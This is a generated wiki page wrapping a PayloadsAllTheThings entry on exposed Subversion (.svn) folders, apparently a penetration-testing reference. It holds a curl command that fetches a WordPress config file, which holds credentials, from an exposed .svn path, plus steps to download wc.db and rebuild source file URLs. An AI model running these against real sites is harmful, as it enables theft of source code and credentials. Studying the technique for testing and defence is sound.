---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Subversion

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-source-code-management-subversion` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Source Code Management/Subversion.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Subversion](../../topics/insecure-source-code-management/subversion.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-source-code-management-subversion |
| name | Subversion |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Source%20Code%20Management/Subversion.md |

## Preserved Source Material

````yaml
_body: "# Subversion\n\n> Subversion  (often abbreviated as SVN) is a centralized version control system (VCS) that has been\
  \ widely used in the software development industry. Originally developed by CollabNet Inc. in 2000, Subversion was designed\
  \ to be an improved version of CVS (Concurrent Versions System) and has since gained significant traction for its robustness\
  \ and reliability.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n* [References](#references)\n\n##\
  \ Tools\n\n* [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - Simple script to extract all web resources\
  \ by means of .SVN folder exposed over network.\n\n    ```powershell\n    python svn-extractor.py --url \"url with .svn\
  \ available\"\n    ```\n\n## Methodology\n\n```powershell\ncurl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base\n\
  ```\n\n1. Download the svn database from `http://server/path_to_vulnerable_site/.svn/wc.db`\n\n    ```powershell\n    INSERT\
  \ INTO \"NODES\" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);\n\
  \    ```\n\n2. Download interesting files\n    * remove `$sha1$` prefix\n    * add `.svn-base` postfix\n    * use first\
  \ byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)\n    * create complete path, which will\
  \ be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`\n\n## References\n\
  \n* [SVN Extractor for Web Pentesters - Anant Shrivastava - March 26, 2013](https://web.archive.org/web/20130329022536/http://blog.anantshri.info:80/svn-extractor-for-web-pentesters)"
_relative_path: Insecure Source Code Management/Subversion.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Source Code Management/Subversion.md
````
